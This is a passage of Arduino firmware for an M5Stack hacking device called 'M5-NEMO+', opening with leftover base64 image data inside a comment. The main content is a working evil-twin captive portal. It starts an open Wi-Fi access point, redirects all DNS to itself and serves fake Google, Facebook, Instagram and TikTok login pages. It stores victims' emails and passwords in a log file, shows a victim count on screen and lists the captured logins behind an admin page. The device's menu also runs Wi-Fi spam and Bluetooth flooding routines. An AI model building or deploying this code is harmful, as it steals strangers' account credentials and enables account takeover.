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";
  String tiktokBase64 = "data:image/png;base64,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";
  */
  
  if (webServer.uri() == "/creds") {
    return header("<style>h2 { text-align: center; }</style>Login com Creds") +
           "<center><form action='/post' method='post'>" +
           "<div style=\"width: 400px;\"><b>Password:</b> <center><input type='password' name='password'></input><br><br><input type='submit' value='Login'></center></div>" +
           "</form></center>" +
           footer();
  } else if (webServer.uri() == "/post") {
     String redirectScript = "<script>setTimeout(function() { window.location.href = '" + redirectPage + "'; }, 15000);</script>";

     // script para redirect dentro do /**/ - se for usar, descomentar
     return header("<center>" + String(POST_TITLE) + "</center>") + ("<center>" + String(POST_BODY) + "</center>") /*+ redirectScript*/ + footer();
  } else {
    String socialMediaIcon = "";
    String socialMediaAlt = "";
    String socialMediaHeight = "";

    if (webServer.uri() == "/google") {
      socialMediaIcon = googleBase64;
      socialMediaAlt = "Google";
      socialMediaHeight = "80px";
    } else if (webServer.uri() == "/facebook") {
      socialMediaIcon = facebookBase64;
      socialMediaAlt = "Facebook";
      socialMediaHeight = "80px";
    } else if (webServer.uri() == "/instagram") {
      socialMediaIcon = instagramBase64;
      socialMediaAlt = "Instagram";
      socialMediaHeight = "80px";
    } else if (webServer.uri() == "/tiktok") {
      socialMediaIcon = tiktokBase64;
      socialMediaAlt = "TikTok";
      socialMediaHeight = "80px";
    }

    return header(String("<center><h4>") + TITLE + String("</h4></center>")) + 
           String("<center><img src=\"") + socialMediaIcon + String("\" alt=\"") + socialMediaAlt + String("\" style=\"height: ") + socialMediaHeight + String(";\"></center>") +
           "<center><form action='/post' method='post'>" +
           "<div style=\"width: 350px;\"><b>Email:</b> <center><input type='text' autocomplete='email' name='email' placeholder=''></input></center></div>" +
           "<div style=\"width: 350px;\"><b>Password:</b> <center><input type='password' name='password'></input><br><br><input type='submit' value='Entrar' style='background-color: #0066ff; color: white; border-radius: 5px;'></center></div>" +
           "</form></center>" +
           footer();
  }
}


void BLINK() {
  int count = 0;
  while (count < 5) {
    digitalWrite(BUILTIN_LED, LOW);
    delay(500);
    digitalWrite(BUILTIN_LED, HIGH);
    delay(500);
    count = count + 1;
  }
}


void clearLog() {
  if (SPIFFS.remove(LOG_FILE)) {
    Serial.println("Log file deleted with success");
  } else {
    Serial.println("Error to remove log file");
  }
}

////// CAPTIVE PORTAL START - SETUP - LOOP


// Start Captive Portal
void captivePortal_setup() {
  captivePortalActive = true;

  Serial.println("captivePortal_setup() iniciado");
  
  bootTime = lastActivity = millis();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)

  if (!SPIFFS.begin(true)) {
    Serial.println("Error to mount file systems SPIFFS");
    return;
  }

  webServer.on("/post", []() {
    enteredPassword = input("password");
    if (enteredPassword == adminPassword) {
      webServer.send(HTTP_CODE, "text/html", credsPage());
    } else {
      webServer.send(HTTP_CODE, "text/html", loginPage(selectedSocialMedia));
    }

    capcount = capcount + 1;
    // execute sound if possible
    tone(10, 4000);
    delay(50);
    noTone(10);
    BLINK();
    M5.Lcd.fillScreen(BLACK);

    // Log credentials
    String logEntry = "Social Media: " + selectedSocialMedia + ", Email: " + input("email") + ", Password: " + input("password");
    writeLog(logEntry);
  });

  webServer.on("/creds", HTTP_GET, []() {
    webServer.send(HTTP_CODE, "text/html", loginPage(""));
  });

  webServer.on("/creds", HTTP_POST, []() {
    enteredPassword = input("password");
    if (enteredPassword == adminPassword) {
      webServer.send(HTTP_CODE, "text/html", credsPage());
    } else {
      webServer.send(HTTP_CODE, "text/html", loginPage(selectedSocialMedia));
    }
  });

  webServer.on("/google", []() {
    webServer.send(HTTP_CODE, "text/html", loginPage("Google"));
  });

  webServer.on("/facebook", []() {
    webServer.send(HTTP_CODE, "text/html", loginPage("Facebook"));
  });

  webServer.on("/instagram", []() {
    webServer.send(HTTP_CODE, "text/html", loginPage("Instagram"));
  });

  webServer.on("/tiktok", []() {
    webServer.send(HTTP_CODE, "text/html", loginPage("TikTok"));
  });

  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });

  webServer.on("/web_page", HTTP_GET, []() {
    webServer.send(HTTP_CODE, "text/html", web_page());
  });

  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index());
  });

  webServer.begin();
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}



// Ativation captive portal
void captivePortal_loop() {
   if (captivePortalActive) {
    if ((millis() - lastTick) > TICK_TIMER) {
      lastTick = millis();
      if (capcount >= previous) {
        previous = capcount;

        // depuration
        Serial.println("captivePortal_loop() iniciado | capcount: " + String(capcount) + " previous: " + String(previous));
        
        // display captive portal
        M5.Lcd.fillScreen(BLACK);
        M5.Lcd.setSwapBytes(true);
        M5.Lcd.setTextSize(1);
        M5.Lcd.setTextColor(TFT_RED, TFT_BLACK);
        M5.Lcd.setCursor(0, 10);
        M5.Lcd.print("CAPTIVE PORTAL");
        M5.Lcd.setTextColor(TFT_WHITE, TFT_BLACK);
        M5.Lcd.setCursor(0, 35);
        M5.Lcd.print("WiFi IP: ");
        M5.Lcd.println(APIP);
        M5.Lcd.printf("SSID: %s\n", SSID_NAME);
        M5.Lcd.printf("Victim Count: %d\n", capcount);

        M5.Lcd.setTextColor(TFT_WHITE, TFT_BLACK);
        //check_menu_press();
      }
    }
    dnsServer.processNextRequest();
    webServer.handleClient();
  }  
}


////// END CAPTIVE PORTAL /////

///////////////////////////////

/////////// MAIN //////////////


void bootScreen(){
  // Boot Screen
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(BIG_TEXT);
  DISP.setCursor(40, 0);
  DISP.println("M5-NEMO+");
  DISP.setCursor(10, 30);
  DISP.setTextSize(SMALL_TEXT);
  DISP.printf("%s-%s\n",buildver,platformName);
#if defined(CARDPUTER)
  DISP.println("Next: Down Arrow");
  DISP.println("Prev: Up Arrow");
  DISP.println("Sel : Enter or ->");
  DISP.println("Home: Esc   or <- ");
  DISP.println("         Press a key");
  while(true){
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isChange()) {
      mmenu_drawmenu();
      delay(250);
      break;
    }
  }
#else
  DISP.println("Next: Side Button");
  DISP.println("Sel : M5 Button");
  DISP.println("Home: Power Button");
  delay(3000);
#endif
}

/// ENTRY ///

void setup() {
#if defined(CARDPUTER)
  auto cfg = M5.config();
  M5Cardputer.begin(cfg, true);
#else
  M5.begin();
#endif
  #if defined(USE_EEPROM)
    EEPROM.begin(EEPROM_SIZE);
    Serial.printf("EEPROM 0: %d\n", EEPROM.read(0));
    Serial.printf("EEPROM 1: %d\n", EEPROM.read(1));
    Serial.printf("EEPROM 2: %d\n", EEPROM.read(2));
    Serial.printf("EEPROM 3: %d\n", EEPROM.read(3));
    if(EEPROM.read(0) > 3 || EEPROM.read(1) > 30 || EEPROM.read(2) > 100 || EEPROM.read(3) > 1) {
      // Assume out-of-bounds settings are a fresh/corrupt EEPROM and write defaults for everything
      Serial.println("EEPROM likely not properly configured. Writing defaults.");
      EEPROM.write(0, 3);    // Left rotation
      EEPROM.write(1, 15);   // 15 second auto dim time
      EEPROM.write(2, 100);  // 100% brightness
      EEPROM.write(3, 0); // TVBG NA Region
      EEPROM.commit();
    }
    rotation = EEPROM.read(0);
    screen_dim_time = EEPROM.read(1);
    brightness = EEPROM.read(2);
    region = EEPROM.read(3);
  #endif
  #if defined(AXP)
    M5.Axp.ScreenBreath(brightness);
  #endif
  DISP.setRotation(rotation);
  DISP.setTextColor(WHCOLOR, BGCOLOR);
  bootScreen();

  // Pin setup
#if defined(M5LED)
  pinMode(M5_LED, OUTPUT);
  digitalWrite(M5_LED, HIGH); //LEDOFF
#endif
#if !defined(KB)
  pinMode(M5_BUTTON_HOME, INPUT);
  pinMode(M5_BUTTON_RST, INPUT);
#endif
  // Random seed
  randomSeed(analogRead(0));

  // Create the BLE Server
  BLEDevice::init("");
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  // Finish with time to show logo
}

void loop() {
  // This is the code to handle running the main loops
  // Background processes
  switcher_button_proc();
#if defined(AXP) && defined(RTC)
  screen_dim_proc();
#endif
#if defined(CARDPUTER)
  check_kb();
#endif
  check_menu_press();
  
  // Switcher
  if (isSwitching) {
    isSwitching = false;
    switch (current_proc) {
#if defined(RTC)
      case 0:
        clock_setup();
        break;
#endif
      case 1:
        mmenu_setup();
        break;
      case 2:
        smenu_setup();
        break;
#if defined(RTC)
      case 3:
        timeset_setup();
        break;
      case 4:
        dmenu_setup();
        break;
#endif
      case 5:
        tvbgone_setup();
        break;
#if defined(AXP)
      case 6:
        battery_setup();
        break;
#endif
#if defined(ROTATION)
      case 7:
        rmenu_setup();
        break;
#endif
      case 8:
        aj_setup();
        break;
      case 9:
        aj_adv_setup();
        break;
      case 10:
        credits_setup();
        break;
      case 11:
        wifispam_setup();
        break;
      case 12:
        wsmenu_setup();
        break;
      case 13:
        tvbgmenu_setup();
        break;
      case 14:
        wscan_setup();
        break;
      case 15:
        wscan_result_setup();
        break;
      case 16:
        btmenu_setup();
        break;
      case 17:
        btmaelstrom_setup();
        break;
      case 18:
        //qrmenu_setup();
        break;
      case 20:
        captivePortal_setup();
        break;

    }
  }

  switch (current_proc) {
#if defined(RTC)
    case 0:
      clock_loop();
      break;
#endif
    case 1:
      mmenu_loop();
      break;
    case 2:
      smenu_loop();
      break;
#if defined(RTC)
    case 3:
      timeset_loop();
      break;
    case 4:
      dmenu_loop();
      break;
#endif
    case 5:
      tvbgone_loop();
      break;
#if defined(AXP)
    case 6:
      battery_loop();
      break;
#endif
#if defined(ROTATION)
    case 7:
      rmenu_loop();
      break;
#endif
    case 8:
      aj_loop();
      break;
    case 9:
      aj_adv();
      break;
    case 10:
      // noop - just let the credits stay on screen
      break;
    case 11:
      wifispam_loop();
      break;
    case 12:
      wsmenu_loop();
      break;
    case 13:
      tvbgmenu_loop();
      break;
    case 14:
      wscan_loop();
      break;
    case 15:
      wscan_result_loop();
      break;
    case 16:
      btmenu_loop();
      break;
    case 17:
      btmaelstrom_loop();
      break;
    case 18:
      //qrmenu_loop();
      break;
    case 20:
      captivePortal_loop();
      break;
  }
}
